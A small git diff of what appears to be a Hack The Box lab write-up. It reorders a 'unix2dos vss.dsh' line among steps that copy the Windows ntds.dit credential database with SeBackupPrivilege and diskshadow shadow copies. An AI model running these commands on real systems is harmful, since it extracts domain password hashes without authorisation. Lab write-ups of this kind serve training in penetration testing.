@@ -145,7 +145,6 @@ Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
 
 ```
 https://pentestlab.blog/tag/diskshadow/
-unix2dos vss.dsh
 upload vss.dsh c:\programdata\vss.dsh
 diskshadow /s c:\programdata\vss.dsh
 ```
@@ -154,7 +153,7 @@ diskshadow /s c:\programdata\vss.dsh
 ![image](https://github.com/regarmulia/HTB/assets/33616880/95425630-c31e-492a-9b94-1ddcd202f19d)
 
 ```
-vss.dsh
+unix2dos vss.dsh
 ```
 ```
 set context persistent nowriters
